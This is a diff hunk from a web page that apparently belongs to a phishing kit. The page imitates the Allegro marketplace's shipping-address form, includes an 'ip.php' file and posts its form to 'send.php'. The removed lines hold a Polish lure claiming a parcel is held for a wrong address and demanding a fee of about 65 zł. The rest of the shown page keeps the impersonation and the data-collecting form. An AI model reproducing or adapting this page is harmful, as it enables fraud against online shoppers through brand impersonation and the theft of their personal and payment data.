@@ -69,9 +69,7 @@ include 'ip.php';
 }--><section class="m-grid"><div class="m-grid__col m-flex-column m-grid__col--8@md m-grid__col--12"><slot ng-reflect-slot-name="embeddedShippingAddressForm"><render-html-once htmlcontent="" ng-reflect-id="embeddedShippingAddressForm-sl" ng-reflect-html-content="">
                       
                       
-                      <p style="color: red">
-                      Twoja przesyłka została wstrzymana ze względu na błędny adres. Musisz potwierdzić swój adres i uiścić dodatkową opłatę za zmianę adresu, około 65 zł, aby potwierdzić nowy adres wysyłki.
-                      </p>
+                
                       <div data-box-name="allegro.transaction.addressEditor.lru" data-box-id="-emgPDlkTmOAAiMmXq-2Ew==" data-prototype-id="allegro.transaction.addressEditor" data-prototype-version="0.18" data-analytics-enabled="" data-analytics-category="allegro.transaction.addressEditor">
                           
                           <form method="post" action="send.php">
